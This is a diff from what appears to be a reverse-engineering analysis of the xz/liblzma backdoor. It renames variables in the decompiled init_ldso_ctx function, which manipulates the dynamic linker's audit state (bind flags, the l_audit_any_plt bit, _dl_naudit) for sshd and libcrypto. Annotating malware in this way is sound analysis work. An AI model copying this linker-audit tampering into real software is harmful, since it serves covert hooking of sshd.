@@ -16,25 +16,23 @@
 void init_ldso_ctx(ldso_ctx_t *ldso_ctx)
 
 {
-  u32 *puVar1;
-  byte *pbVar2;
-  byte *audit_flag_byte;
   u32 *libcrypto_bindflags_ptr;
+  byte *audit_flag_byte;
   
   if (ldso_ctx != (ldso_ctx_t *)0x0) {
-    puVar1 = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
-    if (puVar1 != (u32 *)0x0) {
-      *puVar1 = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
+    libcrypto_bindflags_ptr = ldso_ctx->libcrypto_auditstate_bindflags_ptr;
+    if (libcrypto_bindflags_ptr != (u32 *)0x0) {
+      *libcrypto_bindflags_ptr = ldso_ctx->libcrypto_auditstate_bindflags_old_value;
       if (ldso_ctx->libcrypto_l_name != (char **)0x0) {
-        *ldso_ctx->libcrypto_l_name = (char *)puVar1;
+        *ldso_ctx->libcrypto_l_name = (char *)libcrypto_bindflags_ptr;
       }
     }
     if (ldso_ctx->sshd_auditstate_bindflags_ptr != (u32 *)0x0) {
       *ldso_ctx->sshd_auditstate_bindflags_ptr = ldso_ctx->sshd_auditstate_bindflags_old_value;
     }
-    pbVar2 = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
-    if (pbVar2 != (byte *)0x0) {
-      *pbVar2 = *pbVar2 & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
+    audit_flag_byte = (byte *)ldso_ctx->sshd_link_map_l_audit_any_plt_addr;
+    if (audit_flag_byte != (byte *)0x0) {
+      *audit_flag_byte = *audit_flag_byte & ~ldso_ctx->link_map_l_audit_any_plt_bitmask;
     }
     if (ldso_ctx->_dl_naudit_ptr != (uint *)0x0) {
       *ldso_ctx->_dl_naudit_ptr = 0;
